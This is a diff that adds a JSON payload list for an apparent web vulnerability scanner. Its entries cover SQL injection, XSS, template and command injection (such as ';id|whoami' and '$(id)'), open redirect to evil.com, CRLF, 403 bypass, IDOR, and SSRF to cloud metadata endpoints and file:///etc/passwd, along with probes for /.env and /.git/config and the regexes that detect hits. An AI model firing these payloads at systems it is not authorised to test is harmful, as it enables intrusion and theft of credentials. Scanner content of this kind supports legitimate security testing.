@@ -1,0 +1,150 @@
+[
+  {
+    "id": "P1",
+    "category": "sqli",
+    "tier": 1,
+    "name": "SQLi Boolean/Time/Error",
+    "method": "GET",
+    "param": null,
+    "payloads": [
+      "' OR 1=1-- -",
+      "1' AND SLEEP(3)-- -",
+      "'\" AND pg_sleep(3)-- -",
+      "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- -"
+    ],
+    "detect": {
+      "timeout_ms": 4000,
+      "match_status": [500],
+      "match_regex": ["sql syntax", "mysql", "ora-", "syntax error", "quoted string not properly terminated", "jdbc"]
+    }
+  },
+  {
+    "id": "P2",
+    "category": "xss",
+    "tier": 1,
+    "name": "XSS Reflected",
+    "method": "GET",
+    "param": null,
+    "payloads": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
+    "detect": {
+      "match_regex": ["<script>alert\\(1\\)</script>", "onerror=alert\\(1\\)"]
+    }
+  },
+  {
+    "id": "P3",
+    "category": "ssti",
+    "tier": 1,
+    "name": "SSTI Polyglot (7 engines)",
+    "method": "GET",
+    "param": null,
+    "payloads": [
+      "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
+      "{{9*9}}${9*9}<%= 9*9 %>#{9*9}"
+    ],
+    "detect": {
+      "match_regex": ["(?:49|81)[^0-9]"]
+    }
+  },
+  {
+    "id": "P4",
+    "category": "cmdi",
+    "tier": 1,
+    "name": "Command Injection (5 styles)",
+    "method": "GET",
+    "param": null,
+    "payloads": [
+      ";id|whoami",
+      "|id",
+      "$(id)",
+      "`id`",
+      "%3bid"
+    ],
+    "detect": {
+      "match_regex": ["(uid=\\d|gid=\\d)", "root:", "not recognized as an internal"]
+    }
+  },
+  {
+    "id": "P5",
+    "category": "open-redirect",
+    "tier": 1,
+    "name": "Open Redirect",
+    "method": "GET",
+    "param": null,
+    "payloads": ["//evil.com", "%2f%2fevil.com", "/\\\\evil.com", "https://evil.com"],
+    "detect": {
+      "match_regex": ["location.*evil\\.com"]
+    }
+  },
+  {
+    "id": "P7",
+    "category": "info_disclosure",
+    "tier": 1,
+    "name": "Sensitive Files (20+ paths)",
+    "method": "GET",
+    "param": null,
+    "payloads": [
+      "/.git/config", "/.env", "/Dockerfile", "/actuator", "/actuator/env",
+      "/robots.txt", "/.svn/entries", "/WEB-INF/web.xml", "/.DS_Store", "/config.php.bak"
+    ],
+    "detect": {
+      "match_status": [200],
+      "match_regex": ["\\[core\\]", "APP_KEY", "password", "jdbc:", "api[_-]?key", "DB_PASSWORD"]
+    }
+  },
+  {
+    "id": "P10",
+    "category": "crlf",
+    "tier": 1,
+    "name": "CRLF Injection",
+    "method": "GET",
+    "param": null,
+    "payloads": ["%0d%0aSet-Cookie:crlf=1", "%0D%0AX-Injected:yes"],
+    "detect": {
+      "match_regex": ["crlf=1", "x-injected"]
+    }
+  },
+  {
+    "id": "P11",
+    "category": "misconfig",
+    "tier": 1,
+    "name": "403 Bypass (headers+paths)",
+    "method": "GET",
+    "param": null,
+    "payloads": [
+      "/admin/", "/admin;", "/admin%2e", "/./admin", "/admin..;/", "/admin.json", "/%2e%2e/admin"
+    ],
+    "detect": {
+      "match_status": [200, 301, 302],
+      "diff_mark": true
+    }
+  },
+  {
+    "id": "P12",
+    "category": "idor",
+    "tier": 1,
+    "name": "IDOR numeric traversal",
+    "method": "GET",
+    "param": "id",
+    "payloads": ["1", "2", "3", "100000"],
+    "detect": {
+      "diff_mark": true,
+      "diff_threshold": 100
+    }
+  },
+  {
+    "id": "P13",
+    "category": "ssrf",
+    "tier": 1,
+    "name": "SSRF to metadata/OAST",
+    "method": "GET",
+    "param": "url",
+    "payloads": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://100.100.100.200/latest/meta-data/",
+      "file:///etc/passwd"
+    ],
+    "detect": {
+      "match_regex": ["role-name", "instance-id", "root:x:", "ami-id"]
+    }
+  }
+]
